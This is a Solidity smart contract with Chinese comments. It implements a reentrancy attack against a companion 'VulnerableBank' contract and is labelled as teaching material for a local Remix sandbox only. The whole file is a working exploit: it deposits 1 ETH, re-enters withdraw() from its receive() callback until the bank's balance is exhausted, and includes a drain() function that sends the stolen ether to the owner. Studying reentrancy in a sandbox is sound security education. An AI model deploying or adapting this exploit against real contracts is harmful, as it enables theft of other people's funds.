// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * ⚠️ 仅供学习、请勿用于攻击真实合约。
 *
 * 重入攻击的攻击合约（配合 VulnerableBank 使用）。
 * 请只在 Remix VM（本地沙盒）里演示，切勿指向任何真实/他人合约。
 */

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {
    IVulnerableBank public immutable bank;
    address public owner;
    uint256 public constant UNIT = 1 ether; // 每次提取的单位

    constructor(address bankAddr) {
        bank = IVulnerableBank(bankAddr);
        owner = msg.sender;
    }

    /**
     * 发起攻击：
     *   1. 先向银行存入 1 ETH（获得 1 ETH 的记账余额）
     *   2. 调用 withdraw(1 ether) 触发第一次提款
     *   3. 银行转账 → 触发本合约 receive() → 在里面递归 withdraw
     * 需要在调用时附带 msg.value = 1 ether。
     */
    function attack() external payable {
        require(msg.value == UNIT, "send exactly 1 ETH");
        bank.deposit{value: UNIT}();
        bank.withdraw(UNIT);
    }

    /**
     * 核心：收到 ETH 时的回调。
     * 只要银行里还有至少 1 ETH，就继续重入 withdraw，形成递归掏空。
     */
    receive() external payable {
        if (address(bank).balance >= UNIT) {
            bank.withdraw(UNIT);
        }
    }

    /// 把偷来的 ETH 提走
    function drain() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }

    function stolenBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
